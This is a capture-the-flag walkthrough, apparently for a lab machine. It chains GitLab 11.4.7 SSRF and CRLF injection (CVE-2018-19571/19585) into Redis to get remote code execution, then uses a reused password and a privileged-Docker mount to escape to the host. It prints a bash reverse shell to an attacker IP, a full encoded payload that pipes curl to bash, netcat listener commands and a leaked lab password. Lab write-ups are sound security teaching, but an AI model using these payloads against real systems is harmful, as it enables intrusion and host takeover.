<h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
<h3 id="what-is-recon-and-why-do-we-do-it">What is recon and why do we do it?</h3>
<p>Reconnaissance maps the exposed ports, services, and versions before exploitation. Version information narrows the relevant public vulnerabilities and configuration checks.</p>

<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 -sCV -oA ready_scan 10.129.227.132
</code></pre>
<p><strong>Breaking this down:</strong></p>
<ul>
<li><code>-p-</code> : scan <strong>all 65535 ports</strong>, not just the top 1000. Hidden services often live on high ports.</li>
<li><code>--min-rate 10000</code> : send at least 10,000 packets per second. Faster scan, acceptable in a CTF environment.</li>
<li><code>-sCV</code> : <code>-sC</code> runs default scripts (banner grabbing, HTTP titles, etc.), <code>-sV</code> detects service versions.</li>
<li><code>-oA ready_scan</code> : save output in all formats (nmap, grepable, XML) for later reference.</li>
<li><code>10.129.227.132</code> : the target.</li>
</ul>
<h3 id="results">Results</h3>
<pre tabindex="0" aria-label="Code or terminal block 2"><code>22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu 4
5080/tcp open  http  nginx - GitLab Sign in
</code></pre>

<p>Two ports. SSH is almost never the entry point - you need credentials first. HTTP on a non-standard port (5080 instead of 80) is immediately interesting. The nmap script already told us it's GitLab. The question becomes: <strong>what version, and is it vulnerable?</strong></p>

<h2 id="phase-2-service-enumeration">Phase 2: Service Enumeration</h2>
<h3 id="visiting-the-web-application">Visiting the Web Application</h3>
<p>Open <code>http://10.129.227.132:5080</code> in a browser. You're greeted with a GitLab login page.</p>
<p><strong>Why register an account?</strong><br>GitLab is a self-hosted git platform. Many instances allow open registration. Once logged in, the Help page reveals the exact GitLab version - critical information because GitLab has had serious CVEs in various versions.</p>
<p>After registering and logging in, navigate to <strong>Help</strong> (top-right avatar menu → Help). The page shows:</p>
<pre tabindex="0" aria-label="Code or terminal block 3"><code>GitLab Community Edition 11.4.7
</code></pre>
<p>And crucially, a red warning: <strong>"Update ASAP"</strong></p>

<p>Version 11.4.7. That's from 2018. Immediately search your memory or Google: <em>"GitLab 11.4.7 CVE"</em>. You'll find two related vulnerabilities that chain together for Remote Code Execution (RCE). This is the fundamental skill of a hacker - knowing that old software = known bugs = public exploits.</p>

<h2 id="phase-3-understanding-the-exploit-chain">Phase 3: Understanding the Exploit Chain</h2>
<h3 id="cve-2018-19571-server-side-request-forgery-ssrf">CVE-2018-19571: Server-Side Request Forgery (SSRF)</h3>
<p><strong>What is SSRF?</strong><br>SSRF (Server-Side Request Forgery) is when you trick a server into making HTTP/network requests on your behalf. The server becomes your proxy. This is powerful because the server can reach internal services that you, as an outside attacker, cannot.</p>
<p><strong>How does it work in GitLab 11.4.7?</strong><br>GitLab has a feature: "Import project from URL." You give it a git URL and GitLab's backend server fetches it. GitLab tried to block this being abused by blacklisting <code>127.0.0.1</code> and <code>localhost</code>. But it forgot to block IPv6 representations of localhost. </p>
<p><code>http://[0:0:0:0:0:ffff:127.0.0.1]</code> is a valid IPv6-mapped IPv4 address for <code>127.0.0.1</code>. The blacklist check fails, and GitLab happily connects to its own internal services.</p>
<p><strong>Why do we target Redis on port 6379?</strong><br>GitLab uses Redis internally as a job queue. Redis by default has no authentication and listens on localhost - it was never meant to be exposed. If we can talk to Redis, we can push fake jobs into GitLab's job queue. GitLab workers will pick up those jobs and execute them.</p>
<h3 id="cve-2018-19585-crlf-injection">CVE-2018-19585: CRLF Injection</h3>
<p><strong>What is CRLF Injection?</strong><br>HTTP and many protocols use <code>\r\n</code> (Carriage Return + Line Feed) to separate lines/commands. If an attacker can inject <code>\r\n</code> into a URL or header, they can add extra lines - effectively injecting new commands into the protocol stream.</p>
<p><strong>How does it work here?</strong><br>When GitLab connects to the URL using the <code>git://</code> protocol, the URL path becomes the command sent to the remote service. By URL-encoding <code>\r\n</code> as <code>%0D%0A</code>, we can inject newlines into what GitLab sends to Redis. Instead of Redis receiving one garbled git request, it receives multiple valid Redis commands.</p>
<h3 id="the-chain-together">The Chain Together</h3>
<pre tabindex="0" aria-label="Code or terminal block 4"><code>Attacker → GitLab import URL → GitLab backend fetches git://[IPv6-localhost]:6379/
                                         ↓
                             CRLF-injected Redis commands in URL
                                         ↓
                             Redis receives: MULTI, SADD, LPUSH (job payload), EXEC
                                         ↓
                             GitLab worker picks up job → executes shell command
                                         ↓
                             Reverse shell connects back to attacker
</code></pre>

<h2 id="phase-4-crafting-and-delivering-the-exploit">Phase 4: Crafting and Delivering the Exploit</h2>
<h3 id="prepare-the-reverse-shell-script">Prepare the Reverse Shell Script</h3>
<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">echo '#!/bin/bash' &gt; /tmp/shell.sh
echo 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1' &gt;&gt; /tmp/shell.sh
</code></pre>
<p><strong>Why a separate shell script?</strong><br>The Redis command payload has limited space and special characters need heavy URL-encoding. A clean approach is to have GitLab's server <code>curl</code> a shell script from our machine and pipe it to bash. Simpler payload, easier to debug, and avoids encoding nightmares.</p>
<p><strong>What does the shell.sh do?</strong><br><code>bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1</code> - bash opens a TCP connection to our IP on port 443 and redirects stdin/stdout/stderr through it. This is a standard bash reverse shell. Port 443 (HTTPS) is chosen because firewalls rarely block outbound 443.</p>
<h3 id="start-the-http-server">Start the HTTP Server</h3>
<pre tabindex="0" aria-label="bash code or terminal block 6"><code class="language-bash" data-language="bash">cd /tmp &amp;&amp; python3 -m http.server 80
</code></pre>
<p>This serves <code>shell.sh</code> over HTTP. When our payload tells the GitLab server to <code>curl http://10.10.16.84/shell.sh</code>, it fetches it from here.</p>
<h3 id="start-the-netcat-listener">Start the Netcat Listener</h3>
<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">nc -lnvp 443
</code></pre>
<ul>
<li><code>-l</code> : listen mode</li>
<li><code>-n</code> : no DNS resolution (faster)</li>
<li><code>-v</code> : verbose (show connection info)</li>
<li><code>-p 443</code> : listen on port 443</li>
</ul>
<p>This is waiting to catch the reverse shell when it connects back.</p>
<h3 id="the-exploit-url">The Exploit URL</h3>
<p>In GitLab: <strong>New Project → Import Project → Repo by URL</strong>, paste:</p>
<pre tabindex="0" aria-label="Code or terminal block 8"><code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open%28%5C%27%7Ccurl%20http%3A%2F%2F10.10.16.84%2Fshell.sh%7Cbash%5C%27%29.read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0D%0A%20exec%0D%0A/ssrf.git

<p>The job payload tells GitLab's Ruby worker to run <code>class_eval</code> → <code>open('|curl http://10.10.16.84/shell.sh|bash').read</code> - which executes our shell script.</p>

<pre tabindex="0" aria-label="Code or terminal block 9"><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.227.132] 39540
git@gitlab:~/gitlab-rails/working$
</code></pre>
<p>We have a shell as the <code>git</code> user inside a Docker container.</p>

<h2 id="phase-5-shell-upgrade">Phase 5: Shell Upgrade</h2>
<h3 id="why-upgrade-the-shell">Why Upgrade the Shell?</h3>
<p>The raw netcat shell is a "dumb" terminal - no tab completion, Ctrl+C kills your shell instead of the running process, and many programs won't work properly. Upgrading to a proper PTY (pseudo-terminal) fixes all this.</p>
<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash">python3 -c 'import pty;pty.spawn("bash")'
</code></pre>
<p>Then press <code>Ctrl+Z</code> (background the netcat process), run:</p>
<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">stty raw -echo; fg
</code></pre>
<p>Then hit Enter twice and:</p>
<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">export TERM=xterm
</code></pre>
<p>Now you have a fully interactive shell.</p>

<h2 id="phase-6-user-flag">Phase 6: User Flag</h2>

<pre tabindex="0" aria-label="Code or terminal block 14"><code>db9cd69[redacted]ff977fc1
</code></pre>
<p>The user flag is in <code>/home/dude/</code> - a hint that a user named "dude" exists on the system (or in this container). Check <code>/home/</code> immediately after gaining a shell.</p>

<h2 id="phase-7-container-enumeration-and-privilege-escalation">Phase 7: Container Enumeration and Privilege Escalation</h2>
<h3 id="are-we-in-a-container">Are We in a Container?</h3>
<p>Several signs tell you you're in a Docker container:</p>
<ul>
<li><code>/.dockerenv</code> file exists</li>
<li>Very minimal tooling (no <code>ip</code>, no <code>ifconfig</code>)</li>
<li>Hostname looks like a random hash</li>
<li>Network interfaces show Docker bridge addresses</li>
</ul>
<h3 id="finding-the-password">Finding the Password</h3>
<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">cat /opt/backup/gitlab.rb | grep -v "^#" | grep .
</code></pre>
<p><strong>Why this command?</strong><br><code>gitlab.rb</code> is GitLab's main configuration file. It's 1000+ lines but almost all of them are comments (start with <code>#</code>). The flags:</p>
<ul>
<li><code>grep -v "^#"</code> : remove comment lines</li>
<li><code>grep .</code> : remove blank lines</li>
</ul>
<p>This instantly surfaces the only active configuration line:</p>
<pre tabindex="0" aria-label="Code or terminal block 16"><code>gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
</code></pre>

<p>Configuration files left in backup directories are useful sources. Developers often store credentials in config files. The <code>/opt/backup/</code> directory shouldn't exist in a production container - this is a misconfiguration. Always <code>ls /opt</code>, <code>ls /var</code>, check for backup/config/secret files.</p>
<h3 id="escalating-to-root-in-container">Escalating to Root in Container</h3>
<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">su -
Password: REDACTED
</code></pre>
<pre tabindex="0" aria-label="Code or terminal block 18"><code>root@gitlab:~# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>The SMTP password was reused for root, turning a configuration leak into container root access.</p>
<hr>
<h2 id="phase-8-container-escape">Phase 8: Container Escape</h2>
<h3 id="we-re-root-but-in-a-container">We're Root: But in a Container</h3>
<p>Root inside a container is not root on the host. The container is isolated. The flags we want are on the real host OS. We need to escape.</p>
<h3 id="reading-docker-compose-yml">Reading docker-compose.yml</h3>
<pre tabindex="0" aria-label="bash code or terminal block 19"><code class="language-bash" data-language="bash">cat /opt/backup/docker-compose.yml
</code></pre>
<p>The critical line:</p>
<pre tabindex="0" aria-label="yaml code or terminal block 20"><code class="language-yaml" data-language="yaml">privileged: true
</code></pre>
<p><strong>What does <code>privileged: true</code> mean?</strong><br>A privileged Docker container has almost all Linux capabilities granted. Most importantly, it can access host devices - including block devices (hard drives). This is a massive security misconfiguration. It essentially means the container has hardware-level access to the host.</p>
<h3 id="enumerating-the-host-disk">Enumerating the Host Disk</h3>
<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">lsblk
</code></pre>
<pre tabindex="0" aria-label="Code or terminal block 22"><code>NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   10G  0 disk 
|-sda2   8:2    0  9.5G  0 part /var/log/gitlab
|-sda3   8:3    0  512M  0 part [SWAP]
`-sda1   8:1    0    1M  0 part 
</code></pre>
<p><code>lsblk</code> lists block devices. <code>sda2</code> is the main Linux partition (it's already mounted inside the container at <code>/var/log/gitlab</code> for log persistence). <code>sda2</code> contains the host's root filesystem.</p>
<h3 id="mounting-the-host-filesystem">Mounting the Host Filesystem</h3>
<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">mkdir /mnt/host
mount /dev/sda2 /mnt/host
</code></pre>
<p>Because we're root in a privileged container, we can mount the host's block device directly. This gives us read/write access to the entire host filesystem - as if we were physically sitting at the machine with a live USB.</p>
<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">cat /mnt/host/root/root.txt
</code></pre>
<pre tabindex="0" aria-label="Code or terminal block 25"><code>368efd[redacted]74f87e9f
</code></pre>
<p>Root flag obtained.</p>

<p><code>privileged: true</code> in Docker is essentially saying "this container is the same as the host." It's a well-known Docker escape vector. In real penetration testing, finding this in a docker-compose or Kubernetes pod spec is an instant critical finding. The container boundary provides zero security at this point.</p>
